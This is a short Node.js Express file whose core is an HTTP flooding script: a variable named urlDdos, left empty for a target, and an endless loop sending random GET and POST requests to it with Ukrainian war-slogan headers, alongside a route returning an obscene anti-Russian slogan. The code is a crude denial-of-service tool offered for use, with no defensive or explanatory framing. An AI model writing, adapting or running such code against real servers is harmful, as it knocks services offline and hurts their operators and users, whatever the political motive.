const express = require('express');
const fetch = require("node-fetch");

const app = express();
const port = 3000;

app.get('/', (req, res) => {
    res.send("Русский корабль иди нахуй!");
});
//---------------------------
const urlDdos = "";

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}

const methods = [
    'POST',
    'GET'
];

while(true) {
    const randMethod = methods[getRandomInt(2)];

    fetch(urlDdos, {
        method: randMethod,
        headers: {
            "Русский корабль": "иди нахуй!",
            "Слава Украині!": "Героям слава!"
        }
    });

    console.log(randMethod);
}
//---------------------------
app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
});